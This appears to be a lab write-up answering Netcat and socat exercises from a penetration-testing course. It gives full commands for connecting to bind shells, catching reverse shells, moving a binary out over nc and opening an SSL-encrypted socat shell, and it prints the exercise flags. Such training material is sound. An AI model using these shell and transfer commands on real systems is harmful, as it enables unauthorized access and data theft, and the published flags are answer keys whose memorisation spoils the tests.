---
description: Answers to Practical Tools exercises
---

# Practical Tools

## Netcat

### VM1

Imagine you just gained access to the shell server on the Kali VM #1. You determined this server had the traditional version of Netcat with the `-e` option enabled which has executed the following command: `nc -nlvp 5555 -e /bin/bash`. Use this new access to get the flag.

#### Response

Task is i.e. create bind shell to simple `nc` listener.

```bash
$ nc -nv 192.168.209.52 5555
(UNKNOWN) [192.168.209.52] 5555 (?) open
whoami
student
pwd
/home/student
ls
flag.txt
cat flag.txt
OS{53610a67e1fd8a81faaedca77511a9da}
```

### VM2

In the `/challenge` folder on the Kali VM #2, you will find a helper program called `reverse_shell`. This program takes an IP as its first argument and a port as the second argument. This program will then reach out with a reverse shell to that IP and port. For example, you can run `./reverse_shell 1.2.3.4 1337` to launch a reverse shell to 1.2.3.4 on port 1337. Use this helper program to receive a callback from the shell server and get your flag.

#### Response

I.e. catch reverse shell with `nc`.

Attacker Machine:

```bash
$ nc -lvnp 5555        # Set up listener
```

Target Machine:

```
$ ./reverse_shell <IP> 5555
```

Attacker Machine:

```bash
$ $ nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.119.209] from (UNKNOWN) [192.168.209.52] 41726

$ cat flag.txt
OS{bf8645ccb9d5182d3198b28a2c950516}
```

### VM3

You now need to transfer a file from the Kali VM #3 to your local Kali VM. In the `/challenge` folder in the Kali VM #3, you will find the `flag` program, a Linux binary that contains the flag. Use any of the methods discussed in this module to transfer this file from the shell server to your Kali VM. Once on your Kali VM, make executable and run the `flag` program as root to get the flag. Use port 60000 to accomplish this task.

#### Response

Attacker Machine:

```bash
$ $ nc -lvnp 5555 > flag    
listening on [any] 5555 ...
```

Target Machine:

```bash
$ nc -nv 192.168.119.209 5555 < flag
(UNKNOWN) [192.168.119.209] 5555 (?) open
```

Attacker Machine:

<pre class="language-bash"><code class="lang-bash"><strong>$ chmod +x ./flag
</strong>
$ ./flag 
* Verifying that you are running this binary as root on your Kali VM.
You are not running this binary on your Kali VM.
Transfer this to your Kali VM and then execute it to get the flag.
This binary must be run as root.

$ sudo ./flag 
<strong>* Verifying that you are running this binary as root on your Kali VM.
</strong>Great job. Here is your flag: 
OS{851243e508b87e039d0e52b2c6700cdc}
Press any key to continue...</code></pre>

## Socat

### VM1

Imagine you just gained access to a server. This time, you do not want anyone to be able to view your traffic so you decide to use an encrypted connection. Power on VM #1 and connect to the port in the info tab to get the flag.

#### Response

Use encrypted bind shell to access port 32794 (from VM Info)

```bash
$ socat - OPENSSL:192.168.209.52:32794,verify=0
whoami
student
ls
bind-shell.pem
flag.txt
cat flag.txt
OS{c1a0c0b59a9c400afc41b0e5a16f8edb}
```

### VM2

Exercise is effectively to set up a socat SSL listener and catch a shell (invoked via SSH into the target machine). The exercise is set up improperly unfortunately. The code was retrieved but none of the commands are helpful to store.
